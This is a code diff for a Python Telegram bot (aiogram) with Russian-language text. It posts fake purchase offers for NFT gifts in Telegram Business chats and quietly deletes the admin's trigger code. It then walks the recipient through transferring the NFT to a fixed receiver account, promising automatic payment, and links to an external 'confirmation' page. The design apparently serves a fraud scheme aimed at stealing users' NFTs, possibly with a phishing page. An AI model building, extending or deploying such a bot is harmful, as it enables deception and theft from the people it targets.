@@ -9,7 +9,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
-                           InlineKeyboardMarkup, BusinessConnection)
+                           InlineKeyboardMarkup, BusinessConnection, WebAppInfo)
 from dotenv import load_dotenv
 
 from app import make_offer, get_offer
@@ -99,10 +99,8 @@ async def cmd_buy(msg: Message):
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
-    # Игнорируем, если пишет не админ
     if msg.from_user and msg.from_user.id != ADMIN_ID: return
 
-    # Ищем код оффера в тексте
     m = CODE_RE.search(msg.text)
     if not m: return
 
@@ -110,27 +108,13 @@ async def handle_business_message(msg: Message):
     offer = get_offer(oid)
 
     if not offer:
-        log.error(f"❌ Оффер {oid} не найден в базе")
+        log.error(f"❌ Оффер {oid} не найден")
         return
 
-    log.info(f"✅ Найден оффер {oid}. Начинаем отправку...")
-
-    # Получаем conn_id
     conn_id = msg.business_connection_id
-    if not conn_id:
-        log.error("❌ Нет business_connection_id! Убедись, что это Business-чат.")
-        return
+    if not conn_id: return
 
-    # 1. Удаляем код из чата (тихо, без спама в логи)
-    try:
-        await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
-    except Exception:
-        pass # Если не удалилось (PEER_FLOOD или уже удалено), просто идем дальше
-
-    # 2. Пауза для обхода флуда
-    await asyncio.sleep(2)
-
-    # 3. Формируем карточку
+    # 1. СНАЧАЛА ОТПРАВЛЯЕМ КАРТОЧКУ
     target_user = msg.from_user.username or "buyer"
     card_text = (
         f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
@@ -144,29 +128,27 @@ async def handle_business_message(msg: Message):
          InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
     ])
     
-    # 4. Отправляем
     try:
         await bot.send_message(
-            chat_id=msg.chat.id,
-            text=card_text,
-            business_connection_id=conn_id,
-            reply_markup=kb,
-            disable_web_page_preview=False
+            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
+            reply_markup=kb, disable_web_page_preview=False
         )
-        log.info("✅ Карточка успешно отправлена")
+        log.info("✅ Карточка отправлена")
+        
+        # 2. Удаляем код
+        await asyncio.sleep(0.5)
+        try:
+            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
+        except Exception: pass
+            
     except Exception as e:
-        log.error(f"❌ Ошибка отправки: {e}")
+        log.error(f"❌ Ошибка: {e}")
 
 # ==========================================
-# КНОПКИ
+# ИНТЕРАКТИВНОЕ МЕНЮ (Кнопки)
 # ==========================================
-@router.callback_query(F.data.startswith("reject:"))
-async def on_reject(cb: CallbackQuery):
-    try:
-        await cb.message.edit_reply_markup(reply_markup=None)
-    except: pass
-    await cb.answer("Вы отклонили предложение.")
 
+# 1. Нажатие на "Принять" в первом сообщении
 @router.callback_query(F.data.startswith("accept:"))
 async def on_accept(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
@@ -175,37 +157,86 @@ async def on_accept(cb: CallbackQuery):
         await cb.answer("Оффер истек", show_alert=True)
         return
     
-    conn_id = cb.message.business_connection_id
+    # Меняем текст карточки на меню выбора
+    text = (
+        f"Вы выбрали предложение за <b>{o['price']}</b>.\n\n"
+        f"Для завершения сделки, пожалуйста, ознакомьтесь с инструкцией "
+        f"или подтвердите готовность к передаче NFT."
+    )
     
-    if conn_id:
-        text = (
-            f"<b>Сумма {o['price']} зарезервирована.</b>\n\n"
-            f"Чтобы завершить сделку:\n"
-            f"1. Нажмите на карточку подарка выше\n"
-            f"2. Выберите «Передать NFT»\n"
-            f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
-            f"4. Подтвердите передачу."
-        )
-        try:
-            await bot.send_message(
-                chat_id=cb.message.chat.id, 
-                text=text, 
-                business_connection_id=conn_id
-            )
-        except Exception as e:
-            log.error(f"Ошибка при отправке инструкции: {e}")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Инструкция", callback_data=f"instr:{oid}"),
+         InlineKeyboardButton(text="Принять", callback_data=f"goto:{oid}")]
+    ])
     
+    try:
+        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
+    except Exception as e:
+        log.error(f"Ошибка редактирования: {e}")
+    await cb.answer()
+
+# 2. Нажатие на "Инструкция"
+@router.callback_query(F.data.startswith("instr:"))
+async def on_instr(cb: CallbackQuery):
+    oid = cb.data.split(":", 1)[1]
+    o = get_offer(oid)
+    if not o: return
+    
+    # Показываем инструкцию прямо в этом же сообщении
+    text = (
+        f"<b>Инструкция по передаче NFT:</b>\n\n"
+        f"1. Нажмите на карточку подарка выше\n"
+        f"2. Выберите «Передать NFT»\n"
+        f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
+        f"4. Подтвердите передачу.\n\n"
+        f"После передачи, средства зачислятся автоматически."
+    )
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Понял", callback_data=f"accept:{oid}")]
+    ])
+    
+    try:
+        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
+    except Exception as e:
+        log.error(f"Ошибка инструкции: {e}")
+    await cb.answer()
+
+# 3. Нажатие на "Принять" (переход в меню)
+@router.callback_query(F.data.startswith("goto:"))
+async def on_goto(cb: CallbackQuery):
+    oid = cb.data.split(":", 1)[1]
+    
+    # Ссылка на WebApp (твоя Flask-страница)
+    web_url = f"{BASE_URL}/offer/{oid}"
+    
+    # В бизнес-чатах WebApp-кнопки запрещены, поэтому используем URL
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Открыть меню", url=web_url)]
+    ])
+    
+    text = "Нажмите на кнопку ниже, чтобы перейти в меню подтверждения."
+    
+    try:
+        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
+    except Exception as e:
+        log.error(f"Ошибка перехода: {e}")
+    await cb.answer()
+
+# 4. Кнопка "Отклонить"
+@router.callback_query(F.data.startswith("reject:"))
+async def on_reject(cb: CallbackQuery):
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
     except: pass
-    await cb.answer()
+    await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
 # BUSINESS CONNECTION
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
-    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")
+    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
 # ==========================================
 # ЗАПУСК
